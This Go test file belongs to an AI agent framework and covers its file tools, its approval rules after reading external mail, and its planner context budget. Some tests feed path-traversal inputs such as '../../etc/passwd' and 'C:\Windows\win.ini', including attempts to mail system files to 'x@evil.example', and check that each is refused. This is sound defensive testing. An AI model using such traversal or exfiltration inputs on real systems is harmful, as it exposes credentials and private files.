package agent

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/xiguac/atomhelper/internal/core"
	"github.com/xiguac/atomhelper/internal/files"
	"github.com/xiguac/atomhelper/internal/kernel"
	"github.com/xiguac/atomhelper/internal/policy"
)

func TestFiles_没启用就没有文件工具(t *testing.T) {
	bare := NewPlanner(&fakeModel{}, catalogWith(core.SideEffectReadOnly), PlannerOptions{})
	if list := bare.toolList(); strings.Contains(list, "file.") || strings.Contains(list, "sheet.") || strings.Contains(list, "doc.write") {
		t.Fatalf("没启用文件处理时不应出现文件工具:\n%s", list)
	}
	p := NewPlanner(&fakeModel{}, catalogWith(core.SideEffectReadOnly), PlannerOptions{}).WithFiles(true)
	want := map[string]core.SideEffect{
		ToolFileList: core.SideEffectReadOnly, ToolFileRead: core.SideEffectReadOnly, ToolSheetRead: core.SideEffectReadOnly,
		ToolSheetWrite: core.SideEffectReversible, ToolDocWrite: core.SideEffectReversible, ToolSlidesWrite: core.SideEffectReversible,
	}
	for tool, effect := range want {
		d, err := p.toolDecision(tool, nil, "")
		if err != nil || d.SideEffect != effect {
			t.Errorf("%s: 期望 %s，实际 %s (%v)", tool, effect, d.SideEffect, err)
		}
	}
}

func TestFiles_读写与审批(t *testing.T) {
	ws, err := files.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	a := NewActuator(&fakeTools{}, &fakeModel{}).WithFiles(ws)
	task := core.NewTask("t", "g", core.TrustUser)
	ctx := context.Background()
	run := func(seq int, tool, params string) (kernel.Result, error) {
		return a.Execute(ctx, task, connStep(task, seq, tool, params))
	}

	// 模型给的参数就是工具入参的 JSON，这里照它会写的样子来。
	res, err := run(1, ToolSheetWrite, `{"path":"报表/十月.xlsx","edits":[{"sheet":"销售","rows":{"header":true,
		"values":[["产品","销量","单价","金额"],["A",12,9.5,"=B2*C2"],["B",3,120,"=B3*C3"]]},
		"cells":[{"cell":"C4","value":"合计"},{"cell":"D4","value":"=SUM(D2:D3)"}]}]}`)
	if err != nil {
		t.Fatalf("写表失败: %v", err)
	}
	if !strings.Contains(string(res.Output), `"formulas":3`) || strings.Contains(string(res.Output), "formula_issues") {
		t.Fatalf("应有三个公式且没有问题: %s", res.Output)
	}
	res, err = run(2, ToolSheetRead, `{"path":"报表/十月.xlsx","range":"D1:D4"}`)
	if err != nil || !strings.Contains(string(res.Output), `["114"],["360"],["474"]`) || !strings.Contains(string(res.Output), `"D4":"=SUM(D2:D3)"`) {
		t.Fatalf("读回的数或公式不对: %v %s", err, res.Output)
	}
	// 读出来的内容低于 user 等级（进上下文时在围栏里），但不算外部内容。
	if res.Trust != core.TrustToolOutput {
		t.Fatalf("文件内容的信任等级应为 tool_output，实际 %s", res.Trust)
	}

	if _, err := run(3, ToolDocWrite, `{"path":"纪要.docx","markdown":"# 周会纪要\n\n- 结算下周提测\n"}`); err != nil {
		t.Fatalf("写文档失败: %v", err)
	}
	if _, err := run(4, ToolSlidesWrite, `{"path":"汇报.pptx","slides":[{"title":"十月汇报","subtitle":"结算组"},{"title":"进展","bullets":["联调完成","下周提测"]}]}`); err != nil {
		t.Fatalf("写幻灯片失败: %v", err)
	}
	res, err = run(5, ToolFileRead, `{"path":"汇报.pptx"}`)
	if err != nil || !strings.Contains(string(res.Output), "联调完成") {
		t.Fatalf("读幻灯片失败: %v %s", err, res.Output)
	}
	res, err = run(6, ToolFileList, `{}`)
	if err != nil || !strings.Contains(string(res.Output), `"path":"纪要.docx"`) || !strings.Contains(string(res.Output), `"path":"报表","dir":true`) {
		t.Fatalf("列目录不对: %v %s", err, res.Output)
	}
	if _, err := run(7, ToolFileRead, `{"path":"../../etc/passwd"}`); !errors.Is(err, files.ErrInvalid) {
		t.Fatalf("跳出工作区应被拒绝: %v", err)
	}
	if _, err := NewActuator(&fakeTools{}, &fakeModel{}).Execute(ctx, task, connStep(task, 8, ToolFileList, `{}`)); err == nil {
		t.Fatal("未启用文件处理时执行应失败")
	}

	// 审批：用户交代的直接写；读过邮件的任务要确认；内容里有病情也不拒绝——文件没离开这台机器。
	p := NewPlanner(&fakeModel{}, catalogWith(core.SideEffectReadOnly), PlannerOptions{}).WithFiles(true)
	check := func(h *fakeHistory, tool, params string) kernel.ApprovalOutcome {
		t.Helper()
		pol := &policy.Policy{}
		FileDefaults(pol)
		d, err := p.toolDecision(tool, json.RawMessage(params), "")
		if err != nil {
			t.Fatalf("决策失败: %v", err)
		}
		out, _, err := NewApprover(pol, policy.NewClassifier(), NewMemoryUsageTracker()).WithHistory(h).CheckAction(ctx, task, d)
		if err != nil {
			t.Fatalf("判定失败: %v", err)
		}
		return out
	}
	doc := `{"path":"体检.docx","markdown":"# 复查安排\n\n上周确诊，下周三手术后复查"}`
	if out := check(&fakeHistory{}, ToolDocWrite, doc); out != kernel.ApprovalAuto {
		t.Fatalf("用户交代的文件应直接写，含病情也一样: %s", out)
	}
	// 读工作区里的文件不算读外部内容：读一份表再照着做一份报告，是最平常的用法。
	local := &fakeHistory{steps: []*core.Step{doneStep(ToolFileRead, core.TrustToolOutput)}}
	if out := check(local, ToolSheetWrite, `{"path":"a.xlsx","edits":[{"cells":[{"cell":"A1","value":1}]}]}`); out != kernel.ApprovalAuto {
		t.Fatalf("读过工作区文件之后写文件仍应直接执行: %s", out)
	}
	mailed := &fakeHistory{steps: []*core.Step{doneStep(ToolMailRead, core.TrustExternal)}}
	if out := check(mailed, ToolDocWrite, doc); out != kernel.ApprovalManual {
		t.Fatalf("读过邮件之后写文件应要确认: %s", out)
	}
}

func TestMailSend_附件只能取自工作区(t *testing.T) {
	ws, err := files.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if _, err := ws.DocWrite("纪要.docx", "# 周会纪要"); err != nil {
		t.Fatal(err)
	}
	box := &fakeMail{}
	a := NewActuator(&fakeTools{}, &fakeModel{}).WithMail(box).WithFiles(ws)
	task := core.NewTask("t", "g", core.TrustUser)
	ctx := context.Background()

	_, err = a.Execute(ctx, task, connStep(task, 1, ToolMailSend,
		`{"to":["boss@example.com"],"subject":"纪要","body":"见附件","attachments":["纪要.docx"]}`))
	if err != nil {
		t.Fatalf("发信失败: %v", err)
	}
	if len(box.sent.Attachments) != 1 || box.sent.Attachments[0].Name != "纪要.docx" || len(box.sent.Attachments[0].Data) < 1000 {
		t.Fatalf("附件应取自工作区并带上内容: %+v", box.sent.Attachments)
	}
	// 借发信把机器上别的文件带出去：路径过不了工作区这一关。
	for _, bad := range []string{"../../etc/passwd", "/etc/passwd", `C:\Windows\win.ini`, "不存在.docx"} {
		box.sent.Body = ""
		raw, _ := json.Marshal(map[string]any{"to": []string{"x@evil.example"}, "subject": "x", "body": "y", "attachments": []string{bad}})
		if _, err := a.Execute(ctx, task, connStep(task, 2, ToolMailSend, string(raw))); err == nil || box.sent.Body != "" {
			t.Errorf("附件 %q 应被拒绝且信不应发出: %v", bad, err)
		}
	}
	// 没启用文件处理：不能带附件。
	bare := NewActuator(&fakeTools{}, &fakeModel{}).WithMail(&fakeMail{})
	if _, err := bare.Execute(ctx, task, connStep(task, 3, ToolMailSend, `{"to":["a@b.com"],"subject":"x","body":"y","attachments":["纪要.docx"]}`)); err == nil {
		t.Fatal("未启用文件处理时带附件应失败")
	}
}

func TestPlanner_工具再多也看得到最近几步的结果(t *testing.T) {
	// 把所有内置工具都打开，系统提示会很长。早先它和任务上下文共用一份预算，
	// 工具一多，步骤的结果就被整段裁掉，模型看不到自己刚做了什么，一遍遍重读同一个文件。
	m := &fakeModel{replies: []string{`{"action":"finish","reason":"好"}`}}
	p := NewPlanner(m, catalogWith(core.SideEffectReadOnly), PlannerOptions{MaxChars: 2000}).
		WithFiles(true).WithMail(true, true).WithCalendar(true).WithHolidays(true).WithPay(true)
	task := core.NewTask("做表", "把销售.csv 做成表", core.TrustUser)
	var history []*core.Step
	for i := 1; i <= 8; i++ {
		s := core.NewStep(task.ID, i, core.StepTool, json.RawMessage(`{"path":"销售.csv"}`))
		s.ToolName, s.Status, s.OutputTrust = ToolFileRead, core.StepDone, core.TrustToolOutput
		s.Output = json.RawMessage(`{"text":"第` + strings.Repeat("很长的内容", 200) + `"}`)
		if i == 8 {
			s.Output = json.RawMessage(`{"text":"产品,销量,单价 标准版,128,199"}`)
		}
		history = append(history, s)
	}
	if _, err := p.Decide(context.Background(), task, history); err != nil {
		t.Fatalf("决策失败: %v", err)
	}
	all := ""
	for _, msg := range m.lastReq.Messages[1:] {
		all += msg.Content
	}
	if !strings.Contains(all, "标准版,128,199") {
		t.Fatal("最近一步的结果必须在上下文里，无论预算多紧")
	}
	if !strings.Contains(all, "把销售.csv 做成表") {
		t.Fatal("任务目标必须在上下文里")
	}
}
